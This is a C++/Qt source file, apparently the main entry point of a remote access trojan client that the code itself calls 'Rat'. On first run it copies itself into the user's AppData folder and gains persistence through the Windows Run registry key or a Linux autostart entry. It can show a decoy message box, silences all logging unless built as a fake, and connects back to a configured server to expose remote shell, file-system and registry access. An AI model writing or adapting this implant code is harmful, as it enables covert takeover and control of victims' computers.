#include <QDir>
#include <QFile>
#include <QSettings>
#include <QStandardPaths>
#include <QTimer>
#include "../config.h"

#include <iostream>

#ifdef QT_DAEMON_STATICLIB
#   define USE_DAEMON
#endif

#ifdef USE_DAEMON
#include "configreader.h"
#   include "qdaemonapplication.h"
#else
#   ifdef QT_WIDGETS_LIB
#      include <QtWidgets/QApplication>
#   elif defined(QT_GUI_LIB)
#      include <QtGui/QGuiApplication>
#   else
#      include <QtCore/QCoreApplication>
#   endif
#endif

#include "../common/consts.h"
#include "../common/abstractregistry.h"
#include "../common/abstractfilesystem.h"
#include "remotecli.h"
#include "client.h"
#include "configreader.h"
#include <ClientHub>
#include <SimpleTokenValidator>
#include <QEventLoop>
#include <QSysInfo>
#include <QThread>

#ifdef QT_STATIC
//#   include <QtPlugin>
//    Q_IMPORT_PLUGIN (QWindowsIntegrationPlugin);
#endif

static ConfigReader config;

void registerTypes() {
    qRegisterMetaType<Neuron::AbstractCall*>();
    qRegisterMetaType<Neuron::ClientHub*>();
    qRegisterMetaType<Neuron::Call<QVariant> *>();
    qRegisterMetaType<AbstractClient*>("Client");
    qRegisterMetaType<AbstractFileSystem*>();
    qRegisterMetaType<AbstractRegistry*>();
}

void initClientHub(Neuron::ClientHub &clientHub) {
    config.setClientHub(&clientHub);

    qDebug() << "Reading config";
    bool ok = config.read(ConfigReader::All);

    if (!ok) {
        qDebug() << "Exiting...";
        return;
    }

    qDebug() << "Config read:" << config.server() << config.port();

    clientHub.setEncoder(new Neuron::SimpleTokenValidator(TOKEN));
    clientHub.setPort(config.port());
    clientHub.setServerAddress(config.server());
    clientHub.setAutoReconnect(true);

    auto client = new Client;
    client->setServerAddress(config.server());
    client->setHub(&clientHub);

    auto file = new AbstractFileSystem;
    clientHub.attachSharedObject(file);

    auto cli = new RemoteCLI;
//    cli->setHub(&clientHub);
    clientHub.attachSharedObject(cli);

    auto reg = new AbstractRegistry;
    clientHub.attachSharedObject(reg);

    clientHub.setPeer(client);

    QObject::connect(&clientHub, &Neuron::ClientHub::connected, [&clientHub, client, file, cli, reg](){
        qDebug() << "Reconected";
        client->setHub(&clientHub);
        cli->setHub(&clientHub);
        file->setHub(&clientHub);
        reg->setHub(&clientHub);
    });
}

void install() {
    QString installPath = config.installPath();

    if (installPath.isEmpty())
           installPath = QStandardPaths::writableLocation(QStandardPaths::AppDataLocation)
        #ifdef Q_OS_WINDOWS
            + "/client.exe";
        #else
            + "/client";
        #endif

    QFileInfo fi(installPath);

    QDir d = fi.dir();
    d.mkpath(fi.dir().path());

    if (QFile::exists(installPath))
        QFile::remove(installPath);

    bool copyOk = QFile::copy(qApp->applicationFilePath(), installPath);

    if (copyOk)
        qDebug() << "copy "<< qApp->applicationFilePath() << "to" << installPath;
    else
        qWarning() << "Unable to copy file to" << installPath;

#ifdef Q_OS_WIN
    QSettings reg("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", QSettings::NativeFormat);
    reg.setValue(config.appName(), installPath.replace("/", "\\") + " --run");
    reg.sync();
#endif
#ifdef Q_OS_LINUX
    auto autoStartPath = QStandardPaths::writableLocation(QStandardPaths::ConfigLocation) + "/autostart/";
    QDir ds;
    ds.mkpath(autoStartPath);

    QString desktopFileContent = QString(R"([Desktop Entry]
Comment[en_US]=
Comment=
Exec=%1
GenericName[en_US]=
GenericName=
Icon=system-run
MimeType=
Name=%2
Path=
StartupNotify=true
Terminal=false
TerminalOptions=
Type=Application
X-DBUS-ServiceName=
X-DBUS-StartupType=
X-KDE-SubstituteUID=false
X-KDE-Username=)");
    QFile desktopFile(autoStartPath + config.appName() + ".desktop");
    if (!desktopFile.open(QIODevice::WriteOnly)) {
        qDebug() << "Unable to create file" << desktopFile.fileName();
        return;
    }

    desktopFile.write(desktopFileContent.arg(installPath, config.appName()).toUtf8());
    desktopFile.close();
#endif

    if (config.showMessageBox()) {
        Client c;
        c.messageBoxSlot(config.messageBoxTitle(), config.messageBody(), 0);
//        c.messageBoxSlot(config.appName(), config.installPath(), 0);
    }
}

void noopMessageOutput(QtMsgType type, const QMessageLogContext &context, const QString &msg)
{
    Q_UNUSED(type)
    Q_UNUSED(context)
    Q_UNUSED(msg)
}

int main(int argc, char *argv[])
{
#ifndef RAT_IS_FAKE
    qInstallMessageHandler(noopMessageOutput);
#endif
#if (RAT_USE_DAEMON == 1)
    QDaemonApplication a(argc, argv);

    QObject::connect(&a, &QDaemonApplication::started, [](){
        qDebug() <<"Started";
    });
    a.setApplicationDescription("Remote administration tool");
#else
#   ifdef QT_WIDGETS_LIB
        QApplication a(argc, argv);
#   elif defined(QT_GUI_LIB)
        QGuiApplication a(argc, argv);
#   else
        QCoreApplication a(argc, argv);
#   endif
#endif


    Neuron::ClientHub clientHub;
    registerTypes();
    initClientHub(clientHub);

    a.setApplicationName(config.appName());
    qDebug() << "Rat started (" + config.appName() + ")";

    if (argc == 1)
        install();

#ifndef QT_NO_DEBUG
    config.print();
#endif
    clientHub.connectToHost(true);

#ifdef USE_DAEMON
    return QDaemonApplication::exec();
#else
    QEventLoop loop;
    loop.exec();
    return a.exec();
#endif
}
